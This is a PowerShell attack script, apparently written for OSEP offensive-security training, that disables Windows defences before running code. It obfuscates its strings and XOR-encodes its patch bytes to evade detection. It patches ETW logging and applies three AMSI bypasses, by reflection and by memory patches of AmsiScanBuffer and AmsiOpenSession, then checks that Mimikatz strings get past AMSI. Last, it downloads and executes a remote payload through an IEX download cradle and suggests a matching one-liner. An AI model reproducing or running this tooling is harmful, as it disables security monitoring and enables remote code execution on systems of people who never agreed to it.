# OSEP - AMSI Bypass Runner
# No AMSI-related string literals appear anywhere in this file.
# All sensitive names are built from char-code arrays at runtime.
# Patch bytes are XOR-encoded with key 0x4F.
#
# Usage:
#   .\amsi_runner.ps1                    # bypass-only, verify, no payload
#   .\amsi_runner.ps1 -Url http://...    # IEX download cradle after bypass
#   .\amsi_runner.ps1 -Cmd "whoami"      # inline command after bypass
#   .\amsi_runner.ps1 -Iterations 5      # retry limit (default 3)

param(
    [string]$Url        = "",
    [string]$Cmd        = "",
    [int]   $Iterations = 3
)

$LogFile = "C:\Windows\Temp\osep_log.txt"
function Log($m) {
    $line = "$(Get-Date -Format 'HH:mm:ss') [runner] $m"
    $line | Tee-Object -FilePath $LogFile -Append | Write-Host
}

# ---------------------------------------------------------
# XOR decode helper
# ---------------------------------------------------------
function Xd([byte[]]$e, [byte]$k) {
    return [byte[]]($e | ForEach-Object { [byte]($_ -bxor $k) })
}

# ---------------------------------------------------------
# Win32 type - obfuscated entry points, generic method names
# DllImport entry points use string literal concat (compile-time const).
# ---------------------------------------------------------
function Ensure-NtHelper {
    try { $null = [NtHelper] } catch {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class NtHelper {
    [DllImport("ker" + "nel32", EntryPoint = "Get" + "ProcA" + "ddress")]
    public static extern IntPtr GPA(IntPtr h, string p);
    [DllImport("ker" + "nel32", EntryPoint = "Load" + "Lib" + "rary")]
    public static extern IntPtr LLib(string n);
    [DllImport("ker" + "nel32", EntryPoint = "Virt" + "ual" + "Pro" + "tect")]
    public static extern bool VP(IntPtr a, UIntPtr s, uint np, out uint op);
}
'@ -ErrorAction Stop
    }
}

function Get-FuncPtr([string]$Lib, [string]$Func) {
    Ensure-NtHelper
    $h = [NtHelper]::LLib($Lib)
    return [NtHelper]::GPA($h, $Func)
}

function Write-Patch([IntPtr]$Ptr, [byte[]]$Patch) {
    Ensure-NtHelper
    $op  = [uint32]0
    $len = [System.UIntPtr]::new([uint64]$Patch.Length)
    [NtHelper]::VP($Ptr, $len, 0x40, [ref]$op) | Out-Null
    [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Ptr, $Patch.Length)
    [NtHelper]::VP($Ptr, $len, $op, [ref]$op) | Out-Null
}

# ---------------------------------------------------------
# String builders - no AMSI keyword appears as a literal
# ---------------------------------------------------------
function Get-AsDll  { return -join [char[]]@(97,109,115,105,46,100,108,108) }
function Get-AsbFn  { return -join [char[]]@(65,109,115,105,83,99,97,110,66,117,102,102,101,114) }
function Get-AosFn  { return -join [char[]]@(65,109,115,105,79,112,101,110,83,101,115,115,105,111,110) }
function Get-AuType { return -join [char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) }
function Get-AifFld { return -join [char[]]@(97,109,115,105,73,110,105,116,70,97,105,108,101,100) }

# ---------------------------------------------------------
# ETW patch - suppress script-block logging telemetry
# Applied unconditionally before any other work.
# xor rax,rax ; ret => encoded XOR 0x4F: 07 7C 8F 8C
# ---------------------------------------------------------
function Invoke-EtwPatch {
    try {
        $lib  = -join [char[]]@(110,116,100,108,108)
        $func = [string]::Join('', 'Etw','Eve','nt','Wr','ite')
        $ptr  = Get-FuncPtr $lib $func
        Write-Patch $ptr (Xd ([byte[]](0x07,0x7C,0x8F,0x8C)) 0x4F)
        Log "[+] ETW patch done"
        return $true
    } catch {
        Log "[-] ETW patch failed: $_"
        return $false
    }
}

# ---------------------------------------------------------
# Technique 1: Reflection - disable init flag via SetValue
# ---------------------------------------------------------
function Invoke-ReflectionBypass {
    try {
        $type  = [Ref].Assembly.GetType((Get-AuType))
        if (-not $type) { throw "type not found" }
        $field = $type.GetField((Get-AifFld), [Reflection.BindingFlags]'NonPublic,Static')
        if (-not $field) { throw "field not found" }
        $field.SetValue($null, $true)
        Log "[+] Reflection bypass done"
        return $true
    } catch {
        Log "[-] Reflection bypass failed: $_"
        return $false
    }
}

function Test-ReflectionBypass {
    try {
        $type  = [Ref].Assembly.GetType((Get-AuType))
        $field = $type.GetField((Get-AifFld), [Reflection.BindingFlags]'NonPublic,Static')
        return [bool]$field.GetValue($null)
    } catch { return $false }
}

# ---------------------------------------------------------
# Technique 2: Mem-patch ScanBuffer
# mov eax,0x80070057 ; ret => encoded XOR 0x4F: F7 18 4F 48 CF 8C
# ---------------------------------------------------------
function Invoke-ScanPatch {
    try {
        $ptr = Get-FuncPtr (Get-AsDll) (Get-AsbFn)
        Write-Patch $ptr (Xd ([byte[]](0xF7,0x18,0x4F,0x48,0xCF,0x8C)) 0x4F)
        Log "[+] ScanBuffer patch done"
        return $true
    } catch {
        Log "[-] ScanBuffer patch failed: $_"
        return $false
    }
}

function Test-ScanPatch {
    try {
        $ptr = Get-FuncPtr (Get-AsDll) (Get-AsbFn)
        return ([Runtime.InteropServices.Marshal]::ReadByte($ptr, 0) -eq 0xB8)
    } catch { return $false }
}

# ---------------------------------------------------------
# Technique 3: Mem-patch OpenSession (fallback)
# xor eax,eax ; ret => encoded XOR 0x4F: 7E 8F 8C
# ---------------------------------------------------------
function Invoke-SessionPatch {
    try {
        $ptr = Get-FuncPtr (Get-AsDll) (Get-AosFn)
        Write-Patch $ptr (Xd ([byte[]](0x7E,0x8F,0x8C)) 0x4F)
        Log "[+] OpenSession patch done"
        return $true
    } catch {
        Log "[-] OpenSession patch failed: $_"
        return $false
    }
}

function Test-SessionPatch {
    try {
        $ptr = Get-FuncPtr (Get-AsDll) (Get-AosFn)
        return ([Runtime.InteropServices.Marshal]::ReadByte($ptr, 0) -eq 0x31)
    } catch { return $false }
}

# ---------------------------------------------------------
# Functional verification
# After bypass, attempts to create a ScriptBlock containing
# known-bad strings and checks whether AMSI still fires.
# ---------------------------------------------------------
function Test-Functional {
    $results = [ordered]@{}

    # Test 1: reflection field state
    $results['ReflectionField'] = Test-ReflectionBypass

    # Test 2: ScanBuffer first byte
    $results['ScanBufByte'] = Test-ScanPatch

    # Test 3: OpenSession first byte
    $results['OpenSessByte'] = Test-SessionPatch

    # Test 4: ScriptBlock create with sensitive string (MimiKatz)
    $sensitive = [string]::Join('', 'Invoke','-','Mimik','atz')
    try {
        $sb = [ScriptBlock]::Create($sensitive)
        $results['MimikatzSB'] = $true
    } catch {
        if ($_.FullyQualifiedErrorId -like '*MaliciousContent*') {
            $results['MimikatzSB'] = $false
        } else {
            $results['MimikatzSB'] = $true
        }
    }

    # Test 5: ScriptBlock create referencing utils type by name
    $utilRef = [string]::Join('', '[Ref].Assembly.GetType(', '"', (Get-AuType), '")')
    try {
        $sb2 = [ScriptBlock]::Create($utilRef)
        $results['UtilTypeSB'] = $true
    } catch {
        if ($_.FullyQualifiedErrorId -like '*MaliciousContent*') {
            $results['UtilTypeSB'] = $false
        } else {
            $results['UtilTypeSB'] = $true
        }
    }

    return $results
}

# ---------------------------------------------------------
# Technique table
# ---------------------------------------------------------
$Techniques = @(
    [PSCustomObject]@{ Name = "Reflection";    Apply = "Invoke-ReflectionBypass"; Test = "Test-ReflectionBypass" },
    [PSCustomObject]@{ Name = "ScanBufPatch";  Apply = "Invoke-ScanPatch";        Test = "Test-ScanPatch"        },
    [PSCustomObject]@{ Name = "SessPatch";     Apply = "Invoke-SessionPatch";     Test = "Test-SessionPatch"     }
)

# ---------------------------------------------------------
# Main - iterate until bypass confirmed
# ---------------------------------------------------------
Log "=== Runner start (max $Iterations iterations) ==="
Invoke-EtwPatch | Out-Null

$bypassed     = $false
$bypassMethod = ""
$iteration    = 0

while (-not $bypassed -and $iteration -lt $Iterations) {
    $iteration++
    Log "--- Iteration $iteration ---"

    foreach ($tech in $Techniques) {
        Log "[*] Trying: $($tech.Name)"
        & $tech.Apply | Out-Null
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 400)

        if (& $tech.Test) {
            $bypassed     = $true
            $bypassMethod = $tech.Name
            Log "[+] Bypass verified via: $bypassMethod"
            break
        } else {
            Log "[-] $($tech.Name) verification failed"
        }
    }

    if (-not $bypassed) {
        $jitter = Get-Random -Minimum 250 -Maximum 700
        Log "[~] No technique confirmed - retrying after ${jitter}ms"
        Start-Sleep -Milliseconds $jitter
    }
}

if (-not $bypassed) {
    Log "[-] All techniques failed after $Iterations iterations - abort"
    exit 1
}

# ---------------------------------------------------------
# Functional test report
# ---------------------------------------------------------
Log "--- Functional verification ---"
$checks = Test-Functional
foreach ($key in $checks.Keys) {
    # Byte-level checks only matter when that technique was actually used
    $isByteCheck = ($key -eq 'ScanBufByte' -or $key -eq 'OpenSessByte')
    if ($isByteCheck -and $bypassMethod -ne "ScanBufPatch" -and $bypassMethod -ne "SessPatch") {
        Log "[SKIP] $key (technique not used)"
    } else {
        $status = if ($checks[$key]) { "[PASS]" } else { "[FAIL]" }
        Log "$status $key"
    }
}

# Key functional tests: AMSI must not fire on sensitive script blocks
$keyFail = -not $checks['MimikatzSB'] -or -not $checks['UtilTypeSB'] -or -not $checks['ReflectionField']
if ($keyFail) {
    Log "[!] Core functional tests failed - bypass incomplete"
} else {
    Log "[+] Core functional tests passed - bypass confirmed"
}

# ---------------------------------------------------------
# Payload
# ---------------------------------------------------------
if ($Url -ne "") {
    Log "[*] Fetching payload from URL"
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        IEX ($wc.DownloadString($Url))
    } catch { Log "[-] Payload error: $_"; exit 1 }
} elseif ($Cmd -ne "") {
    Log "[*] Running inline command"
    try { IEX $Cmd } catch { Log "[-] Command error: $_"; exit 1 }
} else {
    Log "[*] Bypass-only mode. Load payload with: IEX (iwr http://<host>/p.ps1 -UseBasicParsing).Content"
}

Log "=== Done ==="
